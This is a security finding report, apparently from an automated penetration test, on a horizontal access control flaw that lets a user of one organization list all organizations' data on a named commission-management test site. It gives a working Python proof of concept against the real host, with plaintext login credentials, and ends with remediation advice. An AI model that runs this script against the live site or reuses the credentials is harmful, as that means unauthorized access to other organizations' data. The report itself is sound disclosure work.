# Horizontal Access Control Bypass: Organization Users Can Access Other Organizations' Data

**ID:** vuln-0006
**Severity:** HIGH
**Found:** 2026-02-26 12:43:01 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/Account/GetOrganizations
**Method:** GET
**CWE:** CWE-284
**CVSS:** 7.6

## Description

A critical horizontal access control bypass vulnerability was discovered in the commission management application. Organization users can access sensitive data from other organizations, violating the principle of data isolation and exposing confidential business information.

The vulnerability exists in the `/api/Account/GetOrganizations` endpoint, which should only return data for the authenticated user's organization. However, this endpoint returns data for all organizations in the system when accessed by an Organization user, exposing sensitive information including organization names, codes, types, and status.

This vulnerability was discovered during comprehensive access control testing and validated through multiple proof-of-concept tests.

## Impact

Successful exploitation of this vulnerability enables Organization users to:

1. **Access Confidential Business Data**: View sensitive information from other organizations including names, codes, types, and status
2. **Violate Data Isolation**: Bypass intended data isolation boundaries between organizations
3. **Information Gathering**: Collect intelligence about other organizations for competitive advantage or targeted attacks
4. **Regulatory Compliance Violations**: Potentially violate data protection regulations by accessing unauthorized data
5. **Business Intelligence Exposure**: Gain insights into organizational structure and relationships
6. **Targeted Attack Preparation**: Identify specific organizations for further targeted attacks or social engineering

The business impact includes unauthorized access to sensitive business information, violation of data isolation principles, potential regulatory penalties, and competitive disadvantage.

## Technical Analysis

The vulnerability exists due to inadequate organization-level access control enforcement on the `/api/Account/GetOrganizations` endpoint. The application fails to properly filter results based on the authenticated user's organization context.

Key technical observations:
1. **Endpoint Behavior**: The `/api/Account/GetOrganizations` endpoint returns data for all organizations when accessed by an Organization user
2. **Missing Filtering**: No server-side filtering is applied to restrict results to the authenticated user's organization
3. **Data Exposure**: The response includes sensitive fields such as organization name, code, type, status, and other metadata
4. **Authentication Context**: Organization users receive JWT tokens that should limit their access to their own organization's data
5. **Access Control Logic**: The application appears to lack proper organization context validation in the business logic layer

The root cause appears to be:
- Missing or improper organization context validation
- Inadequate data filtering at the API layer
- Overly permissive data access logic
- Lack of proper scoping in database queries

## Proof of Concept

To reproduce this vulnerability:

1. **Authenticate as Organization User**:
   - Username: nlnarayana3858@gmail.com
   - Password: User@1234
   - Obtain the JWT token from the authentication response

2. **Access Organizations Endpoint**:
   - Send a GET request to `/api/Account/GetOrganizations` with the Organization user's JWT token
   - Include the following headers:
     ```
     Authorization: Bearer [Organization User JWT Token]
     Content-Type: application/json
     ```

3. **Observe Data Exposure**:
   - The server responds with HTTP 200 OK
   - The response contains data for ALL organizations in the system (19 organizations)
   - Each organization record includes sensitive information such as:
     - Organization name
     - Organization code
     - Organization type
     - Status
     - Other metadata

4. **Verify Data Isolation Violation**:
   - Compare the organization data with the authenticated user's expected organization
   - Observe that data from other organizations is included in the response
   - Confirm that this violates the principle of data isolation

```
import requests
import json

# Configuration
BASE_URL = "https://commissionstest.callippus.in"
AUTH_ENDPOINT = f"{BASE_URL}/api/authenticate"
ORGS_ENDPOINT = f"{BASE_URL}/api/Account/GetOrganizations"

# Organization User Credentials
ORG_CREDENTIALS = {
    "email": "nlnarayana3858@gmail.com",
    "password": "User@1234",
    "rememberMe": False
}

def authenticate(email, password):
    """Authenticate and return JWT token"""
    response = requests.post(
        AUTH_ENDPOINT,
        json={"email": email, "password": password, "rememberMe": False},
        headers={"Content-Type": "application/json"}
    )
    if response.status_code == 200:
        return response.json().get("id_token")
    else:
        raise Exception(f"Authentication failed: {response.status_code} - {response.text}")

def get_organizations(token):
    """Get organizations data with Organization user token"""
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    response = requests.get(
        ORGS_ENDPOINT,
        headers=headers
    )

    return {
        "status": response.status_code,
        "success": response.status_code == 200,
        "data": response.json() if response.status_code == 200 else None,
        "data_length": len(response.text) if response.status_code == 200 else 0
    }

def main():
    print("=== Horizontal Access Control Bypass Proof of Concept ===")
    print(f"Testing cross-organization data access with Organization user credentials")
    print()

    try:
        # Step 1: Authenticate as Organization user
        print("1. Authenticating as Organization user...")
        org_token = authenticate(ORG_CREDENTIALS["email"], ORG_CREDENTIALS["password"])
        print(f"   Authentication successful. Token: {org_token[:20]}...")

        # Step 2: Access organizations endpoint
        print("\n2. Accessing organizations endpoint...")
        results = get_organizations(org_token)

        # Step 3: Display results
        print(f"\nResults:")
        print(f"   Status: {results['status']}")
        print(f"   Access Granted: {'YES' if results['success'] else 'NO'}")
        print(f"   Response Length: {results['data_length']} bytes")

        if results['success']:
            print(f"\n   Organizations Exposed: {len(results['data'])}")
            print("\n✅ VULNERABILITY CONFIRMED: Organization user can access other organizations' data")

            # Display sample data (first 3 organizations)
            print("\nSample Organization Data:")
            for i, org in enumerate(results['data'][:3]):
                print(f"   {i+1}. {org.get('name', 'N/A')} (Code: {org.get('code', 'N/A')})")
                print(f"      Type: {org.get('type', 'N/A')}, Status: {org.get('status', 'N/A')}")

            print(f"\n   ... and {len(results['data']) - 3} more organizations exposed")
            print("\n   This represents a critical horizontal access control bypass vulnerability")
        else:
            print("\n❌ No vulnerability detected: Organization user cannot access organizations data")

    except Exception as e:
        print(f"\n❌ Error during testing: {str(e)}")

if __name__ == "__main__":
    main()
```

## Remediation

To remediate this horizontal access control bypass vulnerability:

1. **Implement Organization Context Filtering**:
   - Modify the `/api/Account/GetOrganizations` endpoint to filter results based on the authenticated user's organization
   - Ensure all data access queries include organization context filtering

2. **Server-Side Data Filtering**:
   ```csharp
   // Example ASP.NET Core implementation with organization filtering
   [Authorize]
   [HttpGet("GetOrganizations")]
   public IActionResult GetOrganizations()
   {
       var userOrganizationId = User.FindFirst("organization_id")?.Value;
       var organizations = _repository.GetOrganizationsById(userOrganizationId);
       return Ok(organizations);
   }
   ```

3. **Database Query Scoping**:
   - Ensure all database queries include organization ID filtering
   - Use parameterized queries to prevent SQL injection
   - Implement proper JOIN conditions for organization-specific data

4. **API Layer Validation**:
   - Add organization context validation at the API layer
   - Implement middleware to validate organization context for all requests
   - Ensure organization context is properly extracted from JWT claims

5. **Role-Based Data Access**:
   - Implement proper role-based data access controls
   - Ensure Organization users can only access their own organization's data
   - Implement admin-specific endpoints for cross-organization access when needed

6. **Testing**:
   - Implement automated tests to verify organization data isolation
   - Test with users from different organizations to ensure proper restrictions
   - Include negative test cases for cross-organization access attempts

7. **Monitoring**:
   - Implement monitoring for cross-organization access attempts
   - Set up alerts for suspicious data access patterns
   - Regularly review access logs for anomalies

